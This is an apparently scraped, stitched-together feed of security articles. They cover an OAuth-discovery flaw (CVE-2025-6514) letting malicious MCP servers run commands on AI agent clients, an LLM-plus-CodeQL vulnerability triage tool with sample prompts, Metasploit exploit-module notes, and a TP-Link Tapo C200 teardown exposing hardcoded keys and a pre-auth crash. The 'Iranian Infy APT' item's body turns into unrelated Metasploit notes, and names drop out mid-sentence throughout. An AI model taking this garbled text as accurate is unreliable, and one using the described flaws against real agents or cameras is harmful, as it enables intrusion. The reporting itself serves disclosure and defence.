NetSec</source><content:encoded><![CDATA[In late 2025, security researchers disclosed CVE-2025-6514—a critical vulnerability in  that affected 558,846 downloads (HackerNoon). The issue allowed arbitrary OS command execution when connecting to untrusted MCP servers (JFrog advisory).  is used by LLM hosts such as Claude Desktop, Cursor, and Windsurf (JFrog blog).The attack vector exploited a pattern OAuth introduced: dynamic discovery of authorization endpoints (JFrog blog).The bug itself was client-side— failed to sanitize URLs before opening them (JFrog advisory). But the architectural assumption that enabled the attack is OAuth’s: clients should ask servers where to authenticate. That assumption, designed for a world of known identity providers, becomes dangerous when applied to autonomous agents connecting to arbitrary MCP servers.The Model Context Protocol (MCP) has become the standard for connecting AI agents to external tools and services. When an MCP client connects to a remote server, it needs to authenticate. In , that flow asks the server for OAuth metadata (including an ) and then opens the returned URL for the user to authenticate (JFrog blog). The flow looks like:Client asks the MCP server: “Where should I authenticate?”Server responds with OAuth metadata, including an Client opens a browser to that endpointUser logs in, client receives tokensThe vulnerability exploited step 2. A malicious MCP server could return a crafted  URL that, instead of opening a login page, triggered OS command execution when  attempted to open it (JFrog blog; JFrog advisory).The CVE has been patched (fix commit). But the architectural assumption that enabled it remains embedded in how we’re building agent authorization: agents must trust external services to tell them how to authenticate.This is OAuth’s fundamental model. It assumes:A trusted identity provider existsThe client can discover and verify that providerToken exchange happens over secure, authenticated channelsThe human user validates the authentication flowNone of these assumptions hold for autonomous agents operating at scale.When Agent A needs to delegate authority to Agent B to call a third-party API, who is the identity provider? When that delegation happens asynchronously—maybe hours later, maybe through a message queue—how does the OAuth flow complete? When an agent orchestrator spawns hundreds of sub-agents, each needing scoped access to different resources, how many OAuth flows is that?The answer the industry has settled on is: store the credentials, pass them around, hope nothing goes wrong.CVE-2025-6514 shows what “goes wrong” looks like.OAuth was designed for a world where:Humans authenticate to servicesServices are few and well-knownSessions are synchronous and short-livedThe user is present to validate trust decisionsAI agents invert every one of these assumptions:Agents authenticate on behalf of humans (or other agents)Services are numerous, dynamic, and potentially untrustedOperations are asynchronous and long-runningNo human is present to click “Allow”The MCP vulnerability occurred precisely at this inversion point. The protocol asked: “Server, tell me where to authenticate.” The server answered with an attack payload. The client, following OAuth’s discovery model, obeyed.The implication is uncomfortable: every OAuth integration in an agent system is a potential attack vector. Not because OAuth is broken, but because its trust assumptions don’t match agent reality.A Different Model: Capability-Based DelegationWhat if agents didn’t need to ask external services how to authenticate? What if authorization wasn’t about acquiring tokens from trusted third parties, but about presenting cryptographically-verifiable capabilities that carry their own proof of validity?This is the capability-based security model, and it’s designed exactly for distributed, asynchronous, multi-party systems—which is what AI agent architectures actually are.Credentials stay at the boundary. A gateway service holds the actual API keys, OAuth tokens, and secrets. Agents never see them.Agents hold capabilities, not credentials. When a user authorizes an agent to “read my calendar,” the agent receives a capability token that grants exactly that permission—cryptographically signed, time-bounded, and unforgeable.Delegation is structural, not implicit. When Agent A needs Agent B to perform a subtask, A issues an  capability—mathematically guaranteed to grant equal or lesser permissions than A holds. No OAuth flow. No trusting B to tell A where to authenticate.Verification doesn’t require dynamic discovery. A capability token is cryptographically signed against a trust plane the verifier already knows. There’s no “ask the server where to authenticate” step. No metadata endpoint to poison. The attack surface that enabled CVE-2025-6514 simply doesn’t exist.OAuth Discovery AssumptionWhat CVE-2025-6514 Exploited”Trust the server to tell me where to auth”Malicious servers poison the flowNo dynamic discovery—capability tokens carry their own proof”Bearer token proves authorization”Token acquisition itself was attackedProof of Continuity binds to execution context, not exchange”IdP endpoint is safe to open”Endpoint URL was the injection vectorGateway holds credentials, agents hold only capabilities”Discovery metadata is trustworthy”Metadata poisoning enabled RCENo metadata-based auth flow—cryptographic chains onlyThe CVE-2025-6514 attack becomes impossible—not because we added input validation, but because the attack surface doesn’t exist. There’s no OAuth flow to hijack.What This Means for Agent BuildersIf you’re building AI agents today, you’re probably using one of three patterns:1. Environment variables / hardcoded keysThe agent has the actual credentials. Fast to implement, impossible to scope, nightmare to rotate, and a single prompt injection away from exfiltration.2. Secret managers (Vault, AWS Secrets Manager)Better storage, same problem. The agent still retrieves and holds the credential. You’ve secured the vault but handed the key to an entity that processes untrusted input.The “proper” solution—and the pattern that enabled this RCE vulnerability. Works for human-interactive flows, breaks at async boundaries, and creates the trust inversion that CVE-2025-6514 exploited.None of these were designed for autonomous agents delegating to other autonomous agents across trust boundaries.Capability-based delegation is. It’s not a new idea—the theory dates to the 1970s, battle-tested in systems like seL4 and KeyKOS. What’s new is applying it to the specific problem of AI agent authorization.The MCP community is actively working on authorization improvements. The June 2025 spec update discusses OAuth resource servers and related auth guidance, and the November 2025 revision adds client registration improvements. Separately, RFC 9728 introduced protected resource metadata for OAuth ecosystems (RFC 9728). These are steps in the right direction.But they’re still building on OAuth’s discovery model. They’re still assuming agents can safely discover, connect to, and trust external authorization infrastructure—now with better metadata validation, but the same fundamental trust assumption.The next vulnerability won’t be the same as CVE-2025-6514. But it will exploit the same structural assumption: that identity-based authorization, designed for humans clicking through browser flows, can secure autonomous agents operating at machine speed across organizational boundaries.Capability-based delegation offers a different foundation. One where:Trust is cryptographic, not discoveredDelegation is attenuated, not all-or-nothingVerification is local, not dependent on external servicesThe attack surface shrinks instead of growsWe’re building this infrastructure at Amla Labs.

By layering an LLM on top of CodeQL, we significantly reduce the overwhelming noise of false positives that typically buries security teams. The result is a workflow where developers and security researchers can focus only on findings that have genuine potential to be exploited.This approach led us to create , a tool that allows only the “true and brave” issues to pass through its gates. Using Vulnhalla, in just two days of work and with a budget of under $80, we identified the following vulnerabilities:CVE-2025-38676 (Linux Kernel),CVE-2025-9136 (RetroArch),CVE-2025-9809 (Libretro),CVE-2025-9810 (Linenoise).… and we continue to find new leadsThis article is based solely on publicly available information, open-source data and responsible security research. All vulnerabilities described were disclosed to affected vendors prior to publication.Challenges of using LLMs for vulnerability huntingEver since AI entered our lives, we’ve been wondering whether it could be used to identify security vulnerabilities, as manual vulnerability research is time-consuming and requires a significant amount of in-depth knowledge.Turns out we weren’t the only ones thinking about that. Google DeepMind, for example, initiated a project called NapTime, which later evolved into Deep Sleep, designed to identify security issues. Not long ago, OpenAI introduced us to Aardvark, an AI agent intended to achieve the same goal. Clearly, there is a demand to automate the cumbersome job of vulnerability research.In the past, the primary challenge with using large language models (LLMs) for vulnerability detection was the limited context window for a large code base. However, today that’s changing; some models can now handle up to a million tokens.With today’s LLMs, huge context, it mostly comes down to two problems:The WHERE problem is that the LLM doesn’t know which part of the code deserves attention. In a large codebase, the number of possible focus points is massive, which means the model can easily get distracted and look in the wrong place.The WHAT problem is that even if the model examines the correct location, it still needs to guess what kind of bug it should be looking for, such as memory issues, race conditions, or API misuse. Without guidance, it may pick the wrong category entirely and increase the chances of missing the real bug.Let’s explore how Google and OpenAI approached the challenge.Google’s Deep Sleep attempted to address these issues by analyzing code changes, such as git diffs or commit patches, linked to known CVEs, and verifying whether the fix or nearby code contains similar problems.Figure 1: Google’s blog on how Deep Sleep worksIt’s a good approach and handles both the WHERE and WHAT problems reasonably well. However, without a constant supply of new vulnerabilities discovered by researchers, along with their corresponding patches, it risks running out of material to analyze.They claim that around 1.2% of commits introduce known security issues, and their goal is to identify and address these. This helps address the WHERE problem by narrowing focus to potentially dangerous commits, but it doesn’t fully tackle the WHAT problem, since the model still has to decide what kind of bug to look for in each case.Our approach: Combining static analysis with LLMsOur approach to solving the WHERE and WHAT problems involves combining static analysis tools with an LLM.However, before we attempt to understand our approach, let’s first understand what static analysis is.Static analysis is the process of parsing source code statically, without executing it, to identify security bugs. It does so by extracting variables, structures, and code relationships. Save them into a database and build code-flow and data-flow graphs. Those graphs can then be checked against predefined rules or queries. For example, a rule might flag any use of  where the source size isn’t properly bounded by the destination, something that could lead to memory corruption, unsafe flows, and other critical issues.One of the most popular tools in this space is CodeQL, which is owned by GitHub and is integrated into GitHub Actions, allowing developers to scan their code upon build during the CI/CD. It supports a wide range of languages, including C/C++, C#, Java, JavaScript, TypeScript, Python, Go, Ruby, Swift, and Kotlin. You can run it manually through the CLI or via a VS Code extension.CodeQL analysis is based on queries, divided into stable and experimental sets. The stable ones will have a lower percentage of false positives. 

import cpp

from BlockStmt blk
where blk.getNumStmt() = 0
select blk

Snippet 1: Simple CodeQL query that selects all empty blocks in the codeAt this point, you might challenge our approach:If static analysis tools are so powerful, why bother combining them with LLM?To answer that, we tried running CodeQL on a few repositories ourselves.  We selected specific queries that, in our opinion, will be critical in the event of real issues. The result?A massive flood of results.Figure 3: The number of CodeQL results on each repositoryThere are potentially numerous security vulnerabilities that, if reviewed manually, require an average of three minutes per issue, resulting in a single researcher needing more than two years to complete the task. And that’s assuming we work on it as our full-time job, every single day. Meanwhile, new code is written, new queries are added, and if we switch to a new static analysis tool, we have to review thousands of fresh alerts all over again.This makes static analysis tools less effective for tackling real bugs, as the work accumulates, and the likelihood of finding bugs is relatively low.But ignoring those alerts can leave real vulnerabilities in the codebase, waiting for a patient attacker to discover.The false-positive realityYou might wonder how many of those findings are real issues and how many are noise. Honestly, it’s hard to know without spending years reviewing everything. False vary significantly between queries, and there is little research in academia or by security researchers specifically on CodeQL.However, there is extensive research on static analysis tools in general. In one study, developers were asked to test different static analysis tools, and these were some of the quotes:“In one tool we use, about 80% of findings are false positives; only 20% lead to fixes, and even those are rarely serious.”“We wouldn’t mind wading through 100 false positives if  we thought there were actually going to be genuine issues there… we went back to manual reviews.”Static analysis is robust, but the signal-to-noise ratio can be brutal. And that’s precisely why static analysis alone can be challenging at scale, and why combining it with LLMs might even be necessary.Putting the thesis to the testOur thesis on using CodeQL with LLM is straightforward: we take the source code, generate a CodeQL database of it, run CodeQL queries on the database, and then pass every alert from the results to the LLM to determine whether each one is a genuine issue or a false positive.Figure 4: This is what combining CodeQL with LLM will look likeTo test our thesis, let’s start with a simple C code that performs a memcpy operation. 

#include 
#include 
#include 

#define DEST_SIZE 16

size_t read_input(char** sourceBuf) {
    char* buf = malloc(DEST_SIZE + 1);
    size_t bufSize = 0;
    int c;

    while (bufSize < DEST_SIZE) {
        c = getchar();
        if (c == EOF || c == '\n') {
            break;
        }
        buf[bufSize++] = (char)c;
    }

    buf[bufSize] = '\0';

    *sourceBuf = buf;
    return bufSize;
}

int main(void) {
    char destBuf[DEST_SIZE + 1];
    char* sourceBuf;
    size_t sourceLen;

    sourceLen = read_input(&sourceBuf);
    if (sourceLen <= 0) {
        return 1;
    }

    memcpy(destBuf, sourceBuf, sourceLen + 1);
    
    printf("%s\n", destBuf);
    
    free(sourceBuf);

    return 0;
}
Snippet 2: false positive exampleWhen we run CodeQL on this code, it yields this one security issue:However, upon examining the code, it becomes clear that this isn’t the case, and we don’t have a vulnerability here. Both source size and destination size be bigger than the  macro, so the source size can never exceed the destination size. We have a hereNow, if we examine the output from CodeQL, we see that it simply displays a message and a line number.If we simply copy-paste the result from CodeQL into an LLM and ask whether it’s a real issue, of course, it won’t work. A line number by itself gives the LLM zero context.But what if we provide the line of code where the issue exists?
Is that enough?What happens when the LLM gets too little contextUsing the ChatGPT Personalization feature, we added the following prompt as Custom Instructions. 

You are a security static-analysis assistant.

You are given:
- Metadata about a CodeQL alert.
- A snippet of C source code that may contain the reported problem.

Your job:
- Decide whether the alert is likely a real bug, given ONLY the code shown.
- Respond VERY BRIEFLY (at most 2 sentences).

Rules:
- If you can determine it IS a real bug, start with: "Bug:" and give a short reason.
- If you can determine it is NOT a real bug, start with: "Not a bug:" and give a short reason.
- If you CANNOT TELL from the snippet and you need more code, start with: "Unknown:" and state EXACTLY what additional code or context you would need.

Do not speculate beyond the shown code.
Do NOT call something a bug unless the code shown is clearly unsafe.
Always list concrete missing pieces when you answer "Unknown:".
Snippet 3: Custom instructions for ChatGPT to act as a security assistantThen we generated a prompt to be used in ChatGPT-5.1 to test if it works. You can see that the message is directly built from the VS Code CodeQL extension results: 
Static analysis finding:

Name: Copy function using source size
Message: To avoid overflow, this operation should be bounded by destination-buffer size, not source-buffer size.
Location: look at main.c:36 with 'memcpy'

Here is the relevant code with full context:

```c
memcpy(destBuf, sourceBuf, sourceLen + 1);
Snippet 4: Prompt to query the LLM if this is a real issue, given only one lineLet’s see how the LLM responded:Figure 6: ChatGPT response to only one line of codeNot surprisingly, the LLM said it needed more context.
So the interesting question is: how much more? And how much is enough?From the CodeQL results (Figure 5), we only know the line number where the issue occurs. How can we derive more context from that line number? Let’s send additional lines of code before and after, say four lines before and four lines below. 
Static analysis finding:

Name: Copy function using source size
Message: To avoid overflow, this operation should be bounded by destination-buffer size, not source-buffer size.
Location: look at main.c:36 with 'memcpy'

Here is the relevant code with full context:

```c
sourceLen = read_input(&sourceBuf);
if (sourceLen <= 0) {
    return 1;
}

memcpy(destBuf, sourceBuf, sourceLen + 1);
    
printf("%s\n", destBuf);
    
free(sourceBuf);
Snippet 5: Prompt to query the LLM if this is a real issue, given four lines before and afterFigure 7: ChatGPT response to a few lines of codeAs you can see, this is still not enough for the LLM to determine anything reliably.So now what? We have yet to answer these questions: How do we know when the LLM has enough context? Do we need the entire file? Multiple files? Or just the full function? All of these questions are valid, and they led us to consider a different angle.Letting the LLM ask for its own contextOur hypothesis was: Let’s use the LLM to determine what context it needsWe start by providing the issue found by CodeQL with the full function where the issue exists.We ask the LLM which other context it needs.If the LLM asks for more, we provide it on demandFigure 8: The flow with context on demandSounds great in theory, but before we even test that theory, can we even extract the function when we only have the output line number?It turns out that it’s not trivial, especially in CThe complex problem of extracting functions in C“You can’t parse C code with regex.”We either need a compiler or implement a complex parser.For example, consider this C code: 

#define BEGIN {
#define END   }

int log_and_add(int x, int y)
BEGIN
    printf("adding {x,y} = %d\n", x + y);  // brace chars inside string
	
#ifdef DEBUG
    /* Fake function in a comment:
       int fake(int z) { return z*z; }
    */
#endif

    int (*callback)(int);  // looks like a function, but it's a pointer
    return x + y;
END

Snippet 6: It would be hard to parse this code with regex or bracket count. This code is based on a Stack Overflow answer about parsing C functions with regexMacros that are in bracketsFunction call inside a commentPointers that resemble function callsParsing this correctly is… not fun.Why code indexers didn’t workBy now, we thought we might be able to utilize a code indexer like Elixir.Indexers work similarly to static analysis: they traverse the codebase and record all types, functions, variables, and other entities. They’re super valuable for giant projects like the Linux Kernel.This is how you can run Elixir in order to index the Matter library (connecthomeip): 
docker exec -it -e PYTHONUNBUFFERED=1 elixir-container /usr/local/elixir/utils/index-repository connectedhomeip https://github.com/project-chip/connectedhomeip
Snippet 7: Example command for running Elixir’s index-repository utility in Docker, targeting the Matter (connectedhomeip) repository. See Elixir GitHub repository for details.But we ran into two huge problems:It took over 10 hours to index the repository.
Imagine scaling that to large projects.Elixir requires a GitHub URL, but the correct way to clone this repository is with the —, which pulls in all third-party dependencies. Elixir doesn’t support this, so you end up missing the code you depend on.So, code indexers were out.Using CodeQL as a code navigatorThen we realized that if code indexers basically do the same job of static analysis, and we are already using static analysis (CodeQL),Why not use the CodeQL database itself to extract all the necessary context on demand?Run one CodeQL query to get the function whose start line is smaller than the issue line, and the end line is bigger than the issue lineIf the LLM requests additional context, run another query and extract the necessary context.Figure 9: The flow with context on demand using CodeQL queriesIn theory, it can work really well:
CodeQL databases are generated during compile time, meaning:They include all third-party codeThey’re already available via GitHub API (CI/CD).No need to clone the repoQuerying them gives you precise, compiler-level structure.The performance bottleneckWhen we executed these context queries, we discovered that CodeQL queries take about 2.5 minutes on average for each query, since dynamic queries require CodeQL to resolve all types, references, and scopes on the fly.Precompiled queries take around 40 seconds, but to provide the LLM with an on-demand context, we need the query to be dynamic, which translates to an average of minutes.To put this in perspective:
When you run CodeQL on FFmpeg alone, you will get 46,589 potential issues.46,589 × 2.5 minutes = 116472.5 minutes (almost 11 months)So, we needed a better solution.Solution: Pre-Extracting functions into a CSVThen we figured that instead of running every query each time the LLM requests it, we should take a cleaner approach:Write one CodeQL query that selects every function in the database (including the caller function) and dumps it into a CSV file.Yes, the CSV file can be massive, but time is our limitation, not space.Then the workflow becomes:Extract all function information to CSVRun CodeQL on the code and save all the issues.Get the line where each issue occursScan the CSV to find the function :Extract that function directly from the code using the information from the CSV.If the LLM requires the caller function, simply search for its ID in the same context and send the updated context to the LLM.Even better, we can save even more time because every CodeQL database includes a src.zip file containing all the source code used to build the database.There is no need to clone the repository; simply download the database once from the GitHub API.Figure 10: The flow of context on demand using CSV filesWe repeated this process for structs, globals, macros, and other types. 
import cpp

from GlobalOrNamespaceVariable g
select g.getName() as global_var_name,
       g.getLocation().getFile() as file,
       g.getLocation().getStartLine() as start_line,
       g.getLocation().getEndLine() as end_line
Snippet 9: Example of CodeQL query to select all Global VariablesFigure 11: The CSV file outputYou are probably asking yourself, What about the performance? on average to find any other function in the CSV.We now have an effective code navigator that can provide the LLM with the exact context it needs.Testing LLM with full contextNow that we have a reasonably sophisticated AI Agent that can provide the LLM with all the necessary context, everything should work well.We’ll give the LLM the same prompt as before, but this time with the entire context the LLM needs, and see how it responds. Our goal is simple: the LLM should say this is a false positive, because the source buffer can never be larger than the destination.

    return 0;
}
Snippet 10: Prompt to query the LLM if this is a real issue, given the entire contextFigure 12: ChatGPT response when given the entire contextAnd… the LLM got it wrong.The LLM says that the code has a  problem. Even though that’s technically true, any human looking at this code would immediately realize it’s not actually a security issue. So why didn’t the LLM reach the same conclusion?Hint: It’s always the prompt – aka “What (and how!) are you actually asking?” After looking carefully at the prompt, we noticed the problem:The prompt and CodeQL are too focused on confirming whether the pattern  exists.For that specific question, the correct answer is “yes.”But the real question should be:Is this pattern really exploitable? To answer that, we need to examine other parts of the code, understand the data flow, and verify whether the source can ever exceed the destination. The LLM wasn’t instructed to do that.We could modify the prompt and force the LLM to check whether the destination size is smaller than the source, but that would be a trap. Complex code can hide size changes and indirect assignments, and if we start adding specific instructions, we’ll eventually overfit the prompt and miss edge cases.At this point, we realized something important:An LLM can review the code, but it’s akin to having a junior security researcher. We want it to think like an experienced researcher.Figure 13: The way an experienced researcher sees the codeWhen an experienced researcher reviews the code, he would probably have this flow in mind:Identify the sources of variables and how they change over time.That prompted us to consider a better way to build the prompt for the LLM by translating the thought process of experienced researchers, who will look for flows and variable sources. And will test assumptions step by step.Guiding the LLM with high-level questionsInstead of providing the LLM just the issue, we can ask it “ before making a judgment to enhance the LLM’s reasoning process. For example:Where is the source buffer declared?Does this size ever change?Where is the destination buffer declared?Are these buffers assigned from another location?What conditions or operations affect them?

Before deciding if the issue is real, you *MUST* answer first on the questions regarding the source and destination variables.
 
1. Where are they declared, what are their sizes, and do those sizes ever change? 
2. If they take values from other variables, where are those variables declared and what sizes do they have? 
3. Are there any checks or constraints on the source, the destination, or the variables assigned to them? 
4. What other operations act on these variables?

Snippet 11: guided questions for memcpy using source sizeAs you can see, this prompt doesn’t contain any other information about the issue from asking the LLM to describe the flow.Let’s use this prompt while examining the same simple C code from before.Figure 14: ChatGPT response when given the entire context and with Guided questionsThe LLM correctly recognized it as a false positive.Because the LLM generates its output based on the previous text, this format encourages it to reason step-by-step. By answering focused questions about variables and flows, the model simulates the reasoning of a senior researcher, and the final decision is made with all the correct information fresh in context.And since the LLM now “talks through” the variables, sizes, assignments, and paths, it naturally avoids the earlier mistake, requiring no special-case instructions, just like a senior researcher.But it’s important to remember that different types of issues require different guided questions. For some vulnerabilities, the LLM needs to reason about control flow. For others, it must analyze variable types, and in some cases, it has to focus on special conditions or edge cases.The key is to consider how you would explain the issue to a junior security researcher, what you would advise them to look for, and how you would phrase it so they understand the core idea. Those same explanations should become the questions you ask the LLM.Once you craft strong, well-focused questions, they will reliably work for all issues of the same type.Running the method in the real worldA practical answer to the WHERE and WHAT problems in static analysisAn AI agent that extracts all necessary context directly from the CodeQL CSV outputA reliable method to guide the LLM toward evaluating actual vulnerability, rather than matching surface-level patternsWe ran the tool across 100 large open-sourced GitHub repositories, selected by star count in C language, and scanned for multiple different issue types.For each issue category, we designed specific guided questions to focus the LLM on the exact semantics and context required for an accurate judgment of exploitability.The table below presents the aggregated results across all CodeQL queries included in the experiment.Total findings generated by CodeQLRemaining findings after AI filteringFalse-positive reduction rateHow many of the “real” issues were actually exploitable or meaningfulA “real” issue does not automatically imply a CVE-worthy or practically exploitable vulnerability.Even when the code pattern is correct, the function may be:used only in tests or example snippets,part of a non-security-critical component, orhosted in a repository that explicitly warns it is not secure or not intended for production.Therefore, “real” means only “not a false positive,” not necessarily that the issue is exploitable in practice.False Positive Reduction (%)Real Issues (% of Remaining)Copy function using source sizeDangerous use of transformation after operationIncorrect return-value check for scanf-like functionMissing return-value check for a ‘scanf’-like functionnew[] array freed with deleteNot enough memory allocated for array of pointer typeOperator precedence logic errorPointer offset used before checkPointer to stack object used as return valueRedundant/missing null check of parameterScanf function without specified lengthLinux Kernel, bullet3, LibretroUnchecked return value used as offsetUsing this method, we built an open-source tool called . It allows you to download a CodeQL database directly from GitHub, run queries on it, and feed the results into an LLM. For each finding, the tool automatically retrieves the relevant code context and applies issue-specific guided questions. This enables the model to reason more accurately about the underlying logic, filter out false positives, and surface only the findings with real potential.Vulnhalla addresses the persistent signal-to-noise bottleneck in large-scale static analysis by combining CodeQL with LLM-powered reasoning for precise and scalable vulnerability discovery.The tool currently supports full code navigation for C and C++ and includes several example templates for guided questions. We invite the community to contribute by expanding support to additional programming languages. This involves writing CodeQL queries that extract the relevant data into CSV form based on language semantics, and creating new guided-question templates tailored to each issue type and language.Key Takeaways and Next Steps for CodeQL and LLM Vulnerability HuntingOur key findings and technical contributions for the research community are:Up to 96% false positive reduction: In our experiments, we observed up to 96% reduction in false positives for specific issue types, which significantly alleviates the manual review burden of static analysis at scale. This reduction will vary depending on the specific issues and Guided Questions.Performance optimization: Eliminated multi-minute context retrieval latency by pre-indexing CodeQL database entities (functions, structs) into a quickly queryable CSV format. This allows the LLM agent to fetch comprehensive context in approximately 3 seconds per query. We utilized a Guided Question prompting strategy to compel structured LLM reasoning. This technique employs a multi-step analysis: tracing data flow and control flow, which emulates the analysis of experienced researchers, shifting the focus from pattern-matching to assessing real The methodology was validated by directly leading to the discovery of multiple verified vulnerabilities (all of which were handled through responsible disclosure).This validated hybrid approach demonstrates a promising step for AI-based automated vulnerability discovery. By increasing the efficiency and accuracy of identifying high-impact flaws, we believe this work can help significantly close existing security gaps. We are releasing the tool as an open source to encourage further refinement and research.Simcha Kosman is a senior cyber researcher at CyberArk Labs.]]></content:encoded></item><item><title>Iranian Infy APT Resurfaces with New Malware Activity After Years of Silence</title><link>https://thehackernews.com/2025/12/iranian-infy-apt-resurfaces-with-new.html</link><author>The Hacker News</author><category>security</category><enclosure url="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhHegtv-omZYW79shLsEk_Vh8OqZ0lziJ2eEH1ADUh6S26O4zAQVpJ0RPi4Y8sOn1QCZNMVMwJoz8_9KxEGiDsef2EUlIPqPEakq3DA5gNpJGlqRHspRCVBRtZM-9ur6CtAPdwtj57Acs2U3HXg2IV6RWyK51gp-L6VZywbKe3GHWqSyeXzi8UZSkFkmtd6/s1600/desk.jpg" length="" type=""/><pubDate>Sun, 21 Dec 2025 04:22:00 +0000</pubDate><source url="https://thehackernews.com/">The Hacker News</source><content:encoded><![CDATA[Threat hunters have discerned new activity associated with an Iranian threat actor known as Infy (aka Prince of Persia), nearly five years after the hacking group was observed targeting victims in Sweden, the Netherlands, and Turkey.

The first improvement affects all Metasploit modules. When an exploit is used, an initial payload is selected using some basic logic that effectively would make a selection from the first available in alphabetical order. Now Metasploit will prefer a default of x86 Meterpreters for Windows systems (since 32-bit payloads work on both 32-bit and 64-bit versions of Windows) and x64 Meterpreters for all other platforms including Linux. In the context of React2Shell, this means the payload now defaults to x64 for Linux instead of AARCH64.Another improvement that only affects this exploit was the change of the default payload to one leveraging Node.js which is more likely to be present than the wget binary that was required. These defaults should hopefully help users get started with this high-impact exploit with more ease, but of course any compatible payload can still be selected.Stay tuned for the Metasploit annual wrap-up and roadmap announcement coming up!N-able N-Central Authentication Bypass and XXE ScannerPath: Description: This adds an auxiliary module that exploits two CVEs affecting N-able N-Central. CVE-2025-9316, an Unauthenticated Session Bypass and CVE-2025-11700 a XXE (XML External Entity) vulnerability. The module combines both vulnerabilities to achieve unauthenticated file read on affected N-Central instances (versions < 2025.4.0.9).Grav CMS Twig SSTI Authenticated Sandbox Bypass RCEPath: Description: This adds an exploit module for a Server-Side Template Injection (SSTI) vulnerability (CVE-2025-66294) in Grav CMS, versions prior to 1.8.0-beta.27 , that allows bypassing the Twig sandbox to achieve remote code execution. To inject the malicious payload into a form's process section, this module leverages CVE-2025-66301, a broken access control flaw in the /admin/pages/{page_name} endpoint.Enhancements and features (2)#20424 from cdelafuente-r7 - Updates how vulnerabilities and services are reported by adding a resource field to both models. It also add a parents field to make layered services possible. An optional resource field can now be provided and the existing service field has been updated to also accept an option hash.#20771 from zeroSteiner - Updates Metasploit's default payload selection logic to preference x86 payloads over AARCH64 payloads.#20773 from jheysel-r7 - This updates the exploit for React2Shell with a better default payload.As always, you can update to the latest Metasploit Framework with msfupdate and you can get more details on the changes since the last blog post from GitHub:]]></content:encoded></item><item><title>TP-Link Tapo C200: Hardcoded Keys, Buffer Overflows and Privacy in the Era of AI Assisted Reverse Engineering</title><link>https://www.evilsocket.net/2025/12/18/TP-Link-Tapo-C200-Hardcoded-Keys-Buffer-Overflows-and-Privacy-in-the-Era-of-AI-Assisted-Reverse-Engineering/</link><author>/u/_vavkamil_</author><category>netsec</category><pubDate>Fri, 19 Dec 2025 20:55:28 +0000</pubDate><source url="https://www.reddit.com/r/netsec/top/?t=week">Reddit - NetSec</source><content:encoded><![CDATA[Hi friends and welcome to the last post for this year! Whenever someone asks me how to get started with reverse engineering, I always give the same advice: buy the cheapest IP camera you can find. These devices are self-contained little ecosystems - they have firmware you can extract, network protocols you can sniff, and mobile apps you can decompile. Chances are, you’ll find something interesting. At worst, you’ll learn a lot about assembly and embedded systems. At best, you’ll find some juicy vulnerability and maybe learn how to exploit it!I own several TP-Link Tapo C200 cameras myself. They’re cheap (less than 20 EUR from Italy), surprisingly stable, and I genuinely like them - they just work. One weekend, I decided just for fun to take my own advice. The Tapo C200 has been around for a while and has had a few CVEs discovered and more or less patched over the years, so I honestly wasn’t expecting to find much in the latest firmware. However, I wanted to use this chance to perform some AI assisted reverse engineering and test whether I could still find anything at all.I documented the entire process live on Arcadia - my thought process, the dead ends, the AI prompts that worked and the ones that didn’t. If you want the raw, unfiltered version with screenshots and videos of things crashing, go check that out.This post is the cleaned-up version of that journey, where I wanted to show how I approach firmware analysis these days, now that we have AI. You will notice that in several instances I will be particularly lazy and delegate to AI things I could have done manually and/or inferred myself after some more work. Keep in mind that while I  generally lazy, this was also an experiment in integrating and documenting how effective AI can be for security research and reverse engineering, and especially in making them accessible to less experienced/sophisticated researchers/attackers.
        Old friend JD-GUI to reverse the Android app and get a sense of things
    Grok to give a quick AI assisted look into prior research.   
    The first step is always obtaining the firmware binary file and this time it was super easy! After some basic reversing of the Tapo Android app, I found out that TP-Link have their entire firmware repository in an open S3 bucket. No authentication required. So, you can list and download every version of every firmware they’ve ever released for any device they ever produced:I grabbed version 1.4.2 Build 250313 Rel.40499n for the C200 (Hardware Revision 3), named Tapo_C200v3_en_1.4.2_Build_250313_Rel.40499n_up_boot-signed_1747894968535.bin, and started poking around. However, the first attempt at identifying its format via binwalk was not successful, indicating that some sort of encryption or obfuscation was in place.And here is where I started using AI. I used Grok to do some deep research on how to decrypt the firmware for these cameras. Since I knew other hackers worked on this before, I delegated searching into hundreds of relevant web pages to the AI:Thanks to Grok, the tp-link-decrypt tool and the fact that every firmware image for every device seems to be encrypted the same exact way, we can now decrypt the firmware. The tool extracts RSA keys from TP-Link’s own GPL code releases - they publish the decryption keys themselves as part of their open source obligations.After decryption, the firmware revealed a fairly standard structure: a bootloader, a kernel, and a SquashFS root filesystem.Ghidra to decompile and understand the MIPS binaries
    GhidraMCP to let an AI connect to my running Ghidra instance and support me in the process.
    
            Cline
         to ask AI to explore the filesystem and find interesting components.
    Once extracted, I used AI and Cline to explore the filesystem in search of which components handle the discovery protocol, camera web API, video streaming, etc all discovered earlier while reversing the Android app.Loading Ghidra and giving a quick look at the  binary, revealed the first interesting thing:This private key is not generated at boot. Similarly to CVE-2025-1099 for the C500, the C200 embeds in its firmware the private key that serves the SSL for a few APIs. If you’re on the same network as a camera, you can MitM and decrypt their HTTPS traffic with keys you extracted from the firmware image - without ever touching the hardware. For a  camera streaming video of people’s homes, this is… not ideal.I kept loading the other interesting binaries and exploring them in Ghidra using AI to quickly get a sense of the main features and possible entry points for an attacker.Asking AI to explain a function and its relation to the other functions proved to be very useful for instance to understand encryption / obfuscation routines and network protocol handlers. This allows you to go from here:To a higher level understanding that the AI can provide:Another technique I found particularly effective is asking the AI to analyze a given function of interest and rename its variables and parameters to something meaningful based on context. Then do the same for the functions it calls, recursively following the branches you’re interested in. After a few iterations, what started as FUN_0042eb7c(undefined2 *param_1, undefined4 param_2, int param_3) becomes handleConnectAp(connection *conn, int flags, json *params) - and suddenly the decompiled code reads almost like the original source. This iterative refinement approach, which I find a great example of human-AI collaboration where neither alone would be as efficient, is how I mapped most of the HTTP handlers, discovery protocol, and so on. What follows is the bottom line of my findings. For more details on the process, refer to the original Discord thread.As a side note, I did not investigate (much) the exploitability of the following bugs to achieve code execution, mostly because I’m not familiar with MIPS, and it was not my intent. You can however do it relatively easily once obtained a shell via physical access, due to the presence of the  binary in the firmware.Bug 1: Pre-Auth ONVIF SOAP XML Parser Memory Overflow (CVE-2025-8065)The Tapo C200 exposes an ONVIF service via the  server listening on port 2020 for interoperability with standard video management systems. The problem is in how it parses SOAP XML requests.When processing XML elements, the parser (soap_parse_and_validate_request at ) calls  without any bounds checking on the number of elements or total memory allocation. Send it enough XML elements, and you’ll overflow allocated memory.Send this, and the camera crashes, requiring a power cycle to recover.CVSS v4.0 